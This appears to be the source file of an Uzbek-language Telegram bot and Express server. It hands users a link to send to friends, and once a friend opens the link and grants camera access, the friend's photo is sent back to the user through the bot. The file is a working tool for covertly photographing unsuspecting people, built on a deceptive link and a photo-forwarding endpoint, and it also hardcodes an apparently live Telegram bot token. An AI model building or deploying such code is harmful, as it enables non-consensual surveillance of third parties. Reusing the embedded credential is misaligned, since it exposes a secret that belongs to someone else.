import express from "express";
import TelegramBot from "node-telegram-bot-api";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram bot token
const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";

// BASE_URL Render.com domeningiz
const BASE_URL = "https://korish.onrender.com";

// Botni polling bilan ishga tushiramiz (lokal va Render.com uchun)
const bot = new TelegramBot(TOKEN, { polling: true });

// Tugmalar
const buttons = {
  reply_markup: {
    keyboard: [
      [{ text: "📸 Rasm olish" }, { text: "📢 Kanal" }],
      [{ text: "🆘 Yordam" }],
    ],
    resize_keyboard: true,
  },
};

// JSON limitni oshiramiz
app.use(express.json({ limit: "5mb" }));
app.use(express.urlencoded({ extended: true, limit: "5mb" }));

// Static fayllar
app.use(express.static(__dirname));

// /start komandasi
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `Salom ${msg.from.first_name}! Botga xush kelibsiz!\n\nRasm olish uchun pastdagi tugmadan foydalaning.`,
    buttons
  );
});

// Tugmalarni qabul qilish
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "📸 Rasm olish") {
    const url = `${BASE_URL}/selfie/${chatId}`;
    bot.sendMessage(
      chatId,
      `📷 Rasm olish uchun quyidagi havolani do‘stingizga yuboring:\n\n${url}`
    );
  }

  if (text === "📢 Kanal") {
    bot.sendMessage(
      chatId,
      "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 Kanalga qo‘shilish",
                url: "https://t.me/koryapman_bot",
              },
            ],
          ],
        },
      }
    );
  }

  if (text === "🆘 Yordam") {
    bot.sendMessage(
      chatId,
      "📸 *Rasm olish* tugmasini bosing va berilgan linkni do‘stingizga yuboring.\n\nDo‘stingiz linkga kirib kamera ruxsatini bersa, sizga uning rasmi yuboriladi.",
      { parse_mode: "Markdown" }
    );
  }
});

// Selfie sahifa
app.get("/selfie/:chatId", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Selfie API (rasmni Telegramga yuboradi)
app.post("/api/selfie", (req, res) => {
  const chatId = req.body.chat_id;
  const photoBase64 = req.body.photo;

  if (!chatId || !photoBase64)
    return res.status(400).json({ ok: false, error: "chat_id yoki photo yo‘q" });

  const buffer = Buffer.from(photoBase64, "base64");

  bot
    .sendPhoto(chatId, buffer, { caption: "Foydalanuvchi rasmi olindi ✅" })
    .then(() => res.json({ ok: true }))
    .catch((err) => res.status(500).json({ ok: false, error: err.message }));
});

// Server ishga tushishi
app.listen(PORT, () => {
  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
});
